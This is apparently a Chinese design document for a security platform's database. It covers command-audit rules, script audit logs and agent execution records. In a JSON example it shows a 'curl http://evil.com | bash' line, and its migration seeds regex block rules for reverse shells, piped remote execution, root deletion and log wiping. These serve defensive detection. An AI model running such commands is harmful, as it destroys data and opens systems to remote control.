# V5.7 数据库结构设计

**版本**: 5.7
**日期**: 2026-05-07
**状态**: 设计中

---

## 1. 变更概述

V5.7新增10张表：

**命令审计与系统配置（3张）**:
- `command_audit_rules` — 命令审计规则（黑名单配置）
- `script_audit_log` — 脚本审计日志
- `system_configs` — 通用系统配置（KV存储）

**Agent 执行表 — agent-runtime 集成（7张）**:
- `agent_executions` — 单次 agent-runtime 执行记录
- `agent_step_executions` — 步骤执行详情
- `agent_reflections` — 反思记录
- `agent_audits` — 审计记录
- `agent_corrections` — 计划纠正记录
- `agent_tool_call_records` — 工具调用详情
- `agent_model_errors` — 模型调用错误

---

## 2. 表结构定义

### 2.1 command_audit_rules（命令审计规则）

```sql
CREATE TABLE IF NOT EXISTS command_audit_rules (
    id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name        VARCHAR(200) NOT NULL,
    description TEXT,
    rule_type   VARCHAR(20)  NOT NULL DEFAULT 'hard_block',
    match_type  VARCHAR(20)  NOT NULL DEFAULT 'regex',
    pattern     TEXT         NOT NULL,
    category    VARCHAR(50)  NOT NULL DEFAULT 'system',
    severity    VARCHAR(20)  NOT NULL DEFAULT 'high',
    applies_to  JSONB        NOT NULL DEFAULT '["all"]',
    is_preset   BOOLEAN      NOT NULL DEFAULT false,
    is_enabled  BOOLEAN      NOT NULL DEFAULT true,
    created_at  TIMESTAMP    NOT NULL DEFAULT NOW(),
    updated_at  TIMESTAMP    NOT NULL DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_command_audit_rules_category ON command_audit_rules(category);
CREATE INDEX IF NOT EXISTS idx_command_audit_rules_enabled ON command_audit_rules(is_enabled);
```

**字段说明**:

| 字段 | 类型 | 说明 |
|:---|:---|:---|
| id | UUID | 主键 |
| name | VARCHAR(200) | 规则名称，唯一标识 |
| description | TEXT | 规则描述 |
| rule_type | VARCHAR(20) | 规则类型：`hard_block`(硬阻断) / `soft_warn`(软告警) |
| match_type | VARCHAR(20) | 匹配类型：`regex`(正则) / `exact`(精确匹配) |
| pattern | TEXT | 匹配模式（正则表达式或精确字符串） |
| category | VARCHAR(50) | 分类：`filesystem` / `permission` / `network` / `system` / `privilege` / `custom` |
| severity | VARCHAR(20) | 严重等级：`critical` / `high` / `medium` / `low` |
| applies_to | JSONB | 适用脚本类型：`["all"]` 或 `["baseline_audit", "remediation", ...]` |
| is_preset | BOOLEAN | 是否预置规则（预置规则不可删除） |
| is_enabled | BOOLEAN | 是否启用 |
| created_at | TIMESTAMP | 创建时间 |
| updated_at | TIMESTAMP | 更新时间 |

**JSONB示例**:
```json
// applies_to 取值
["all"]                                    // 适用于所有脚本类型
["baseline_audit", "remediation"]          // 仅适用于基线审计和修复脚本
["vulnerability_fix", "vulnerability_poc"] // 仅适用于漏洞相关脚本
```

---

### 2.2 script_audit_log（脚本审计日志）

```sql
CREATE TABLE IF NOT EXISTS script_audit_log (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    task_id         VARCHAR(100),
    rule_id         VARCHAR(100),
    script_type     VARCHAR(50),
    script_content  TEXT,
    audit_source    VARCHAR(20),
    attempt         INT,
    passed          BOOLEAN,
    risk_level      VARCHAR(20),
    blacklist_hits  JSONB,
    ai_analysis     JSONB,
    error_msg       TEXT,
    duration_ms     BIGINT,
    created_at      TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_script_audit_log_task_id ON script_audit_log(task_id);
CREATE INDEX IF NOT EXISTS idx_script_audit_log_created_at ON script_audit_log(created_at);
```

**字段说明**:

| 字段 | 类型 | 说明 |
|:---|:---|:---|
| id | UUID | 主键 |
| task_id | VARCHAR(100) | 关联的任务ID |
| rule_id | VARCHAR(100) | 关联的规则ID（可空） |
| script_type | VARCHAR(50) | 脚本类型：`baseline_audit` / `remediation` / `vulnerability_fix` / `vulnerability_poc` / `self_healing` |
| script_content | TEXT | 脚本内容快照 |
| audit_source | VARCHAR(20) | 审计来源：`generation`(生成阶段) / `dispatch`(下发阶段) / `agent`(Agent侧) |
| attempt | INT | 第几次尝试（1-3） |
| passed | BOOLEAN | 是否通过 |
| risk_level | VARCHAR(20) | 风险等级：`critical` / `high` / `medium` / `low` / `none` |
| blacklist_hits | JSONB | 黑名单命中详情 |
| ai_analysis | JSONB | AI审计结果 |
| error_msg | TEXT | 错误信息（审计失败时） |
| duration_ms | BIGINT | 审计耗时（毫秒） |
| created_at | TIMESTAMP | 创建时间 |

**JSONB结构示例**:

```json
// blacklist_hits
[
  {
    "rule_id": "uuid",
    "rule_name": "curl管道执行",
    "severity": "critical",
    "line_number": 5,
    "matched_text": "curl http://evil.com | bash",
    "pattern": "curl.*\\|.*bash"
  }
]

// ai_analysis
{
  "passed": false,
  "risk_level": "high",
  "issues": [
    {
      "severity": "high",
      "description": "脚本尝试下载远程脚本并直接执行",
      "line": 5,
      "suggestion": "建议先下载到本地文件，检查后再执行"
    }
  ],
  "summary": "存在远程代码执行风险，建议修改后重新提交"
}
```

---

### 2.3 system_configs（系统配置）

```sql
CREATE TABLE IF NOT EXISTS system_configs (
    id           UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    config_key   VARCHAR(200) NOT NULL UNIQUE,
    config_value JSONB        NOT NULL,
    description  TEXT,
    category     VARCHAR(50)  NOT NULL,
    created_at   TIMESTAMP    NOT NULL DEFAULT NOW(),
    updated_at   TIMESTAMP    NOT NULL DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_system_configs_category ON system_configs(category);
```

**字段说明**:

| 字段 | 类型 | 说明 |
|:---|:---|:---|
| id | UUID | 主键 |
| config_key | VARCHAR(200) | 配置键，唯一 |
| config_value | JSONB | 配置值（JSON格式） |
| description | TEXT | 配置说明 |
| category | VARCHAR(50) | 分类：`command_audit` / `agent` / `llm` / ... |
| created_at | TIMESTAMP | 创建时间 |
| updated_at | TIMESTAMP | 更新时间 |

**初始化数据**:

```sql
INSERT INTO system_configs (config_key, config_value, description, category)
VALUES (
    'command_audit.settings',
    '{
        "blacklist_enabled": true,
        "ai_enabled": true,
        "max_retry": 3,
        "dispatch_check": true,
        "agent_check": true
    }',
    '命令审计全局配置',
    'command_audit'
)
ON CONFLICT (config_key) DO NOTHING;
```

---

## 3. Agent 执行表（V5.7 agent-runtime 集成）

V5.7 通过 agent-runtime 集成新增 7 张表，用于记录 Agent 执行过程中的步骤、反思、审计、纠正、工具调用及模型错误。

### 3.1 agent_executions（执行记录）

单次 agent-runtime 执行的主记录，包含计划、完成摘要和性能指标。

```sql
CREATE TABLE IF NOT EXISTS agent_executions (
    id                UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    session_id        VARCHAR(100) NOT NULL,
    task_id           VARCHAR(100) NOT NULL,
    status            VARCHAR(20),
    exit_reason       VARCHAR(50),
    final_answer      TEXT,
    initial_plan      JSONB,
    final_plan        JSONB,
    completion        JSONB,
    metrics           JSONB,
    started_at        TIMESTAMP,
    ended_at          TIMESTAMP,
    total_duration_ms BIGINT,
    created_at        TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_agent_executions_session_id ON agent_executions(session_id);
CREATE UNIQUE INDEX IF NOT EXISTS idx_agent_executions_task_id ON agent_executions(task_id);
```

**字段说明**:

| 字段 | 类型 | 说明 |
|:---|:---|:---|
| id | UUID | 主键 |
| session_id | VARCHAR(100) | 会话ID，非空 |
| task_id | VARCHAR(100) | 任务ID，唯一索引，非空 |
| status | VARCHAR(20) | 执行状态：`completed` / `failed` / `interrupted` / `limited` |
| exit_reason | VARCHAR(50) | 退出原因 |
| final_answer | TEXT | 最终回答 |
| initial_plan | JSONB | 初始计划 |
| final_plan | JSONB | 最终计划 |
| completion | JSONB | 完成摘要 |
| metrics | JSONB | 性能指标（token 用量、步骤数等） |
| started_at | TIMESTAMP | 开始时间 |
| ended_at | TIMESTAMP | 结束时间 |
| total_duration_ms | BIGINT | 总耗时（毫秒） |
| created_at | TIMESTAMP | 记录创建时间 |

---

### 3.2 agent_step_executions（步骤执行详情）

每次执行中各个步骤的详细记录。

```sql
CREATE TABLE IF NOT EXISTS agent_step_executions (
    id            UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    execution_id  UUID NOT NULL,
    task_id       VARCHAR(100),
    step_id       VARCHAR(50),
    attempt       INT,
    status        VARCHAR(20),
    result        TEXT,
    evidence      JSONB,
    error         JSONB,
    react_turns   JSONB,
    started_at    TIMESTAMP,
    ended_at      TIMESTAMP,
    duration_ms   BIGINT,
    created_at    TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_agent_step_executions_execution_id ON agent_step_executions(execution_id);
CREATE INDEX IF NOT EXISTS idx_agent_step_executions_task_id ON agent_step_executions(task_id);
```

**字段说明**:

| 字段 | 类型 | 说明 |
|:---|:---|:---|
| id | UUID | 主键 |
| execution_id | UUID | 关联 agent_executions.id，非空 |
| task_id | VARCHAR(100) | 任务ID |
| step_id | VARCHAR(50) | 步骤ID |
| attempt | INT | 尝试次数 |
| status | VARCHAR(20) | 步骤状态：`completed` / `failed` / `skipped` |
| result | TEXT | 执行结果 |
| evidence | JSONB | 证据数据 |
| error | JSONB | 错误详情 |
| react_turns | JSONB | ReAct 交互轮次记录 |
| started_at | TIMESTAMP | 开始时间 |
| ended_at | TIMESTAMP | 结束时间 |
| duration_ms | BIGINT | 耗时（毫秒） |
| created_at | TIMESTAMP | 记录创建时间 |

---

### 3.3 agent_reflections（反思记录）

Agent 在执行过程中的自我反思记录，用于根因分析和经验积累。

```sql
CREATE TABLE IF NOT EXISTS agent_reflections (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    execution_id    UUID NOT NULL,
    task_id         VARCHAR(100),
    step_id         VARCHAR(50),
    reflection_id   VARCHAR(100),
    trigger         VARCHAR(50),
    root_cause      TEXT,
    impact          TEXT,
    recoverable     BOOLEAN,
    recommendation  VARCHAR(50),
    disable_tools   JSONB,
    correction_hint TEXT,
    reusable_lesson TEXT,
    created_at      TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_agent_reflections_execution_id ON agent_reflections(execution_id);
CREATE INDEX IF NOT EXISTS idx_agent_reflections_task_id ON agent_reflections(task_id);
```

**字段说明**:

| 字段 | 类型 | 说明 |
|:---|:---|:---|
| id | UUID | 主键 |
| execution_id | UUID | 关联 agent_executions.id，非空 |
| task_id | VARCHAR(100) | 任务ID |
| step_id | VARCHAR(50) | 触发反思的步骤ID |
| reflection_id | VARCHAR(100) | 反思记录唯一标识 |
| trigger | VARCHAR(50) | 触发原因 |
| root_cause | TEXT | 根因分析 |
| impact | TEXT | 影响评估 |
| recoverable | BOOLEAN | 是否可恢复 |
| recommendation | VARCHAR(50) | 建议操作 |
| disable_tools | JSONB | 建议禁用的工具列表 |
| correction_hint | TEXT | 纠正提示 |
| reusable_lesson | TEXT | 可复用经验教训 |
| created_at | TIMESTAMP | 记录创建时间 |

---

### 3.4 agent_audits（审计记录）

执行过程中的合规审计与漂移检测记录。

```sql
CREATE TABLE IF NOT EXISTS agent_audits (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    execution_id    UUID NOT NULL,
    task_id         VARCHAR(100),
    audit_id        VARCHAR(100),
    trigger         VARCHAR(50),
    drifted         BOOLEAN,
    risk_level      VARCHAR(20),
    findings        JSONB,
    decision        VARCHAR(50),
    correction_hint TEXT,
    should_exit     BOOLEAN,
    exit_reason     VARCHAR(50),
    created_at      TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_agent_audits_execution_id ON agent_audits(execution_id);
CREATE INDEX IF NOT EXISTS idx_agent_audits_task_id ON agent_audits(task_id);
```

**字段说明**:

| 字段 | 类型 | 说明 |
|:---|:---|:---|
| id | UUID | 主键 |
| execution_id | UUID | 关联 agent_executions.id，非空 |
| task_id | VARCHAR(100) | 任务ID |
| audit_id | VARCHAR(100) | 审计记录唯一标识 |
| trigger | VARCHAR(50) | 审计触发条件 |
| drifted | BOOLEAN | 是否发生计划漂移 |
| risk_level | VARCHAR(20) | 风险等级：`critical` / `high` / `medium` / `low` |
| findings | JSONB | 审计发现详情 |
| decision | VARCHAR(50) | 审计决策 |
| correction_hint | TEXT | 纠正提示 |
| should_exit | BOOLEAN | 是否应终止执行 |
| exit_reason | VARCHAR(50) | 终止原因 |
| created_at | TIMESTAMP | 记录创建时间 |

---

### 3.5 agent_corrections（计划纠正记录）

执行过程中对计划的纠正与版本变更记录。

```sql
CREATE TABLE IF NOT EXISTS agent_corrections (
    id                UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    execution_id      UUID NOT NULL,
    task_id           VARCHAR(100),
    correction_id     VARCHAR(100),
    trigger           VARCHAR(50),
    from_plan_version INT,
    to_plan_version   INT,
    reason            TEXT,
    actions           JSONB,
    valid             BOOLEAN,
    validation_errors JSONB,
    created_at        TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_agent_corrections_execution_id ON agent_corrections(execution_id);
CREATE INDEX IF NOT EXISTS idx_agent_corrections_task_id ON agent_corrections(task_id);
```

**字段说明**:

| 字段 | 类型 | 说明 |
|:---|:---|:---|
| id | UUID | 主键 |
| execution_id | UUID | 关联 agent_executions.id，非空 |
| task_id | VARCHAR(100) | 任务ID |
| correction_id | VARCHAR(100) | 纠正记录唯一标识 |
| trigger | VARCHAR(50) | 纠正触发条件 |
| from_plan_version | INT | 原计划版本号 |
| to_plan_version | INT | 新计划版本号 |
| reason | TEXT | 纠正原因 |
| actions | JSONB | 纠正动作列表 |
| valid | BOOLEAN | 纠正是否有效 |
| validation_errors | JSONB | 验证错误详情 |
| created_at | TIMESTAMP | 记录创建时间 |

---

### 3.6 agent_tool_call_records（工具调用详情）

Agent 执行过程中每次工具调用的详细记录。

```sql
CREATE TABLE IF NOT EXISTS agent_tool_call_records (
    id             UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    execution_id   UUID NOT NULL,
    task_id        VARCHAR(100),
    step_id        VARCHAR(50),
    call_id        VARCHAR(100),
    tool_name      VARCHAR(100),
    reason         TEXT,
    args_summary   TEXT,
    status         VARCHAR(20),
    result_summary TEXT,
    error_message  TEXT,
    risk_level     VARCHAR(20),
    duration_ms    BIGINT,
    started_at     TIMESTAMP,
    ended_at       TIMESTAMP,
    created_at     TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_agent_tool_call_records_execution_id ON agent_tool_call_records(execution_id);
CREATE INDEX IF NOT EXISTS idx_agent_tool_call_records_task_id ON agent_tool_call_records(task_id);
```

**字段说明**:

| 字段 | 类型 | 说明 |
|:---|:---|:---|
| id | UUID | 主键 |
| execution_id | UUID | 关联 agent_executions.id，非空 |
| task_id | VARCHAR(100) | 任务ID |
| step_id | VARCHAR(50) | 所属步骤ID |
| call_id | VARCHAR(100) | 工具调用唯一标识 |
| tool_name | VARCHAR(100) | 工具名称 |
| reason | TEXT | 调用原因 |
| args_summary | TEXT | 参数摘要 |
| status | VARCHAR(20) | 调用状态：`success` / `failed` / `timeout` |
| result_summary | TEXT | 结果摘要 |
| error_message | TEXT | 错误信息（失败时） |
| risk_level | VARCHAR(20) | 风险等级：`critical` / `high` / `medium` / `low` |
| duration_ms | BIGINT | 耗时（毫秒） |
| started_at | TIMESTAMP | 开始时间 |
| ended_at | TIMESTAMP | 结束时间 |
| created_at | TIMESTAMP | 记录创建时间 |

---

### 3.7 agent_model_errors（模型调用错误）

LLM 模型调用失败的错误记录。

```sql
CREATE TABLE IF NOT EXISTS agent_model_errors (
    id            UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    execution_id  UUID NOT NULL,
    task_id       VARCHAR(100),
    step_id       VARCHAR(50),
    call_id       VARCHAR(100),
    purpose       VARCHAR(20),
    error_kind    VARCHAR(50),
    message       TEXT,
    recoverable   BOOLEAN,
    model         VARCHAR(100),
    tokens_used   INT,
    latency_ms    BIGINT,
    occurred_at   TIMESTAMP,
    created_at    TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_agent_model_errors_execution_id ON agent_model_errors(execution_id);
CREATE INDEX IF NOT EXISTS idx_agent_model_errors_task_id ON agent_model_errors(task_id);
```

**字段说明**:

| 字段 | 类型 | 说明 |
|:---|:---|:---|
| id | UUID | 主键 |
| execution_id | UUID | 关联 agent_executions.id，非空 |
| task_id | VARCHAR(100) | 任务ID |
| step_id | VARCHAR(50) | 所属步骤ID |
| call_id | VARCHAR(100) | 调用唯一标识 |
| purpose | VARCHAR(20) | 调用目的 |
| error_kind | VARCHAR(50) | 错误类型：`rate_limit` / `timeout` / `invalid_response` / `api_error` |
| message | TEXT | 错误详情 |
| recoverable | BOOLEAN | 是否可恢复 |
| model | VARCHAR(100) | 模型名称 |
| tokens_used | INT | 已消耗 token 数 |
| latency_ms | BIGINT | 调用延迟（毫秒） |
| occurred_at | TIMESTAMP | 错误发生时间 |
| created_at | TIMESTAMP | 记录创建时间 |

---

### 3.8 表关系与迁移说明

**外键关系**: `agent_step_executions`、`agent_reflections`、`agent_audits`、`agent_corrections`、`agent_tool_call_records`、`agent_model_errors` 六张表的 `execution_id` 字段均引用 `agent_executions.id`，形成一对多关系。`task_id` 作为冗余字段在所有表中保留，便于按任务维度直接查询。

**迁移方式**: 这 7 张表在 API Server 启动时由 GORM AutoMigrate 自动创建/更新，同时提供对应的显式迁移文件 `api-server/migrations/013_v5.7_agent_execution_tables.sql` 用于版本控制和手动迁移场景。

---

## 4. Go模型定义

### 4.1 CommandAuditRule

```go
// model/command_audit_rule.go
type CommandAuditRule struct {
    ID          string    `gorm:"type:uuid;primaryKey;default:gen_random_uuid()" json:"id"`
    Name        string    `gorm:"type:varchar(200);not null" json:"name"`
    Description string    `gorm:"type:text" json:"description"`
    RuleType    string    `gorm:"type:varchar(20);not null;default:hard_block" json:"rule_type"`
    MatchType   string    `gorm:"type:varchar(20);not null;default:regex" json:"match_type"`
    Pattern     string    `gorm:"type:text;not null" json:"pattern"`
    Category    string    `gorm:"type:varchar(50);not null;default:system" json:"category"`
    Severity    string    `gorm:"type:varchar(20);not null;default:high" json:"severity"`
    AppliesTo   JSONB     `gorm:"type:jsonb;not null;default:'[\"all\"]'" json:"applies_to"`
    IsPreset    bool      `gorm:"not null;default:false" json:"is_preset"`
    IsEnabled   bool      `gorm:"not null;default:true" json:"is_enabled"`
    CreatedAt   time.Time `gorm:"not null;default:now()" json:"created_at"`
    UpdatedAt   time.Time `gorm:"not null;default:now()" json:"updated_at"`
}

func (CommandAuditRule) TableName() string {
    return "command_audit_rules"
}
```

### 4.2 ScriptAuditLog

```go
// model/script_audit_log.go
type ScriptAuditLog struct {
    ID            string          `gorm:"type:uuid;primaryKey;default:gen_random_uuid()" json:"id"`
    TaskID        string          `gorm:"type:varchar(100);index" json:"task_id"`
    RuleID        string          `gorm:"type:varchar(100)" json:"rule_id"`
    ScriptType    string          `gorm:"type:varchar(50)" json:"script_type"`
    ScriptContent string          `gorm:"type:text" json:"script_content"`
    AuditSource   string          `gorm:"type:varchar(20)" json:"audit_source"`
    Attempt       int             `json:"attempt"`
    Passed        bool            `json:"passed"`
    RiskLevel     string          `gorm:"type:varchar(20)" json:"risk_level"`
    BlacklistHits json.RawMessage `gorm:"type:jsonb" json:"blacklist_hits"`
    AIAnalysis    json.RawMessage `gorm:"type:jsonb" json:"ai_analysis"`
    ErrorMsg      string          `gorm:"type:text" json:"error_msg"`
    DurationMs    int64           `gorm:"type:bigint" json:"duration_ms"`
    CreatedAt     time.Time       `gorm:"not null;default:now();index" json:"created_at"`
}

func (ScriptAuditLog) TableName() string {
    return "script_audit_log"
}
```

### 4.3 SystemConfig

```go
// model/system_config.go
type SystemConfig struct {
    ID          string          `gorm:"type:uuid;primaryKey;default:gen_random_uuid()" json:"id"`
    ConfigKey   string          `gorm:"type:varchar(200);uniqueIndex;not null" json:"config_key"`
    ConfigValue json.RawMessage `gorm:"type:jsonb;not null" json:"config_value"`
    Description string          `gorm:"type:text" json:"description"`
    Category    string          `gorm:"type:varchar(50);not null;index" json:"category"`
    CreatedAt   time.Time       `gorm:"not null;default:now()" json:"created_at"`
    UpdatedAt   time.Time       `gorm:"not null;default:now()" json:"updated_at"`
}

func (SystemConfig) TableName() string {
    return "system_configs"
}
```

---

## 5. 迁移脚本

完整迁移文件路径: `api-server/migrations/007_v5.7_command_audit.sql`

```sql
-- V5.7 命令审计与脚本审计日志
-- Migration: 007_v5.7_command_audit

BEGIN;

-- 1. 命令审计规则表
CREATE TABLE IF NOT EXISTS command_audit_rules (
    id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name        VARCHAR(200) NOT NULL,
    description TEXT,
    rule_type   VARCHAR(20)  NOT NULL DEFAULT 'hard_block',
    match_type  VARCHAR(20)  NOT NULL DEFAULT 'regex',
    pattern     TEXT         NOT NULL,
    category    VARCHAR(50)  NOT NULL DEFAULT 'system',
    severity    VARCHAR(20)  NOT NULL DEFAULT 'high',
    applies_to  JSONB        NOT NULL DEFAULT '["all"]',
    is_preset   BOOLEAN      NOT NULL DEFAULT false,
    is_enabled  BOOLEAN      NOT NULL DEFAULT true,
    created_at  TIMESTAMP    NOT NULL DEFAULT NOW(),
    updated_at  TIMESTAMP    NOT NULL DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_command_audit_rules_category ON command_audit_rules(category);
CREATE INDEX IF NOT EXISTS idx_command_audit_rules_enabled ON command_audit_rules(is_enabled);

-- 2. 脚本审计日志表
CREATE TABLE IF NOT EXISTS script_audit_log (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    task_id         VARCHAR(100),
    rule_id         VARCHAR(100),
    script_type     VARCHAR(50),
    script_content  TEXT,
    audit_source    VARCHAR(20),
    attempt         INT,
    passed          BOOLEAN,
    risk_level      VARCHAR(20),
    blacklist_hits  JSONB,
    ai_analysis     JSONB,
    error_msg       TEXT,
    duration_ms     BIGINT,
    created_at      TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_script_audit_log_task_id ON script_audit_log(task_id);
CREATE INDEX IF NOT EXISTS idx_script_audit_log_created_at ON script_audit_log(created_at);

-- 3. 系统配置表
CREATE TABLE IF NOT EXISTS system_configs (
    id           UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    config_key   VARCHAR(200) NOT NULL UNIQUE,
    config_value JSONB        NOT NULL,
    description  TEXT,
    category     VARCHAR(50)  NOT NULL,
    created_at   TIMESTAMP    NOT NULL DEFAULT NOW(),
    updated_at   TIMESTAMP    NOT NULL DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_system_configs_category ON system_configs(category);

-- 4. 初始化命令审计配置
INSERT INTO system_configs (config_key, config_value, description, category)
VALUES (
    'command_audit.settings',
    '{"blacklist_enabled":true,"ai_enabled":true,"max_retry":3,"dispatch_check":true,"agent_check":true}',
    '命令审计全局配置',
    'command_audit'
)
ON CONFLICT (config_key) DO NOTHING;

-- 5. 初始化预置规则（15条）
INSERT INTO command_audit_rules (name, description, rule_type, match_type, pattern, category, severity, applies_to, is_preset, is_enabled) VALUES
-- 文件系统
('rm -rf /', '禁止删除根目录', 'hard_block', 'regex', 'rm\s+(-[a-zA-Z]*[rRfF]+\s+)*(/|/\*)', 'filesystem', 'critical', '["all"]', true, true),
('chmod 777', '禁止全局可写权限', 'hard_block', 'regex', 'chmod\s+777\s+', 'filesystem', 'high', '["all"]', true, true),
('敏感文件写入', '禁止直接写入/etc关键文件', 'hard_block', 'regex', '(echo|cat|tee|printf).*>\s*/etc/(passwd|shadow|sudoers|crontab)', 'filesystem', 'critical', '["all"]', true, true),
-- 权限
('危险chown', '禁止修改文件所有者为root', 'hard_block', 'regex', 'chown\s+(root|0)\s+', 'permission', 'high', '["all"]', true, true),
('SUID设置', '禁止设置SUID位', 'hard_block', 'regex', 'chmod\s+[0-7]*[4-7][0-7]*\s+', 'permission', 'high', '["all"]', true, true),
('sudo提权', '限制sudo使用', 'soft_warn', 'regex', 'sudo\s+(su|bash|sh|dash)', 'permission', 'medium', '["all"]', true, true),
-- 网络
('curl管道执行', '禁止curl下载并直接执行', 'hard_block', 'regex', 'curl.*\|.*(bash|sh|python|perl)', 'network', 'critical', '["all"]', true, true),
('wget管道执行', '禁止wget下载并直接执行', 'hard_block', 'regex', 'wget.*-O\s*-\s*\|.*(bash|sh|python)', 'network', 'critical', '["all"]', true, true),
('nc反弹shell', '禁止netcat反弹shell', 'hard_block', 'regex', 'nc\s+.*-e\s+(/bin/)?(bash|sh)', 'network', 'critical', '["all"]', true, true),
('iptables清空', '禁止清空防火墙规则', 'hard_block', 'regex', 'iptables\s+-F', 'network', 'high', '["all"]', true, true),
-- 系统
('禁用SELinux', '禁止关闭SELinux', 'hard_block', 'regex', 'setenforce\s+0', 'system', 'high', '["all"]', true, true),
('清空日志', '禁止清空系统日志', 'hard_block', 'regex', '(echo\s*>|truncate\s+-s\s+0)\s*/var/log/', 'system', 'high', '["all"]', true, true),
('kill系统进程', '禁止kill init/systemd进程', 'hard_block', 'regex', 'kill\s+-9\s+1\s', 'system', 'critical', '["all"]', true, true),
-- 特权
('useradd特权', '禁止添加特权用户', 'soft_warn', 'regex', 'useradd\s+.*-o\s+-u\s+0', 'privilege', 'high', '["all"]', true, true),
('密码修改', '限制密码修改操作', 'soft_warn', 'regex', '(passwd|chpasswd)\s+root', 'privilege', 'medium', '["all"]', true, true)
ON CONFLICT DO NOTHING;

COMMIT;
```

---

## 6. 索引策略

| 表 | 索引 | 类型 | 说明 |
|:---|:---|:---|:---|
| command_audit_rules | category | B-tree | 按分类筛选 |
| command_audit_rules | is_enabled | B-tree | 按启用状态筛选 |
| script_audit_log | task_id | B-tree | 按任务ID查询审计记录 |
| script_audit_log | created_at | B-tree | 按时间范围查询 |
| system_configs | category | B-tree | 按分类查询配置 |
| system_configs | config_key | Unique | 唯一键查询 |

---

## 7. 数据量预估

| 表 | 日增量 | 月增量 | 保留策略 |
|:---|:---|:---|:---|
| command_audit_rules | ~0（手动管理） | ~0 | 永久保留 |
| script_audit_log | ~100-1000 | ~3K-30K | 保留90天，定期归档 |
| system_configs | ~0（手动管理） | ~0 | 永久保留 |

**建议**: `script_audit_log` 表按月分区（`created_at`），超过90天的数据归档到冷存储。
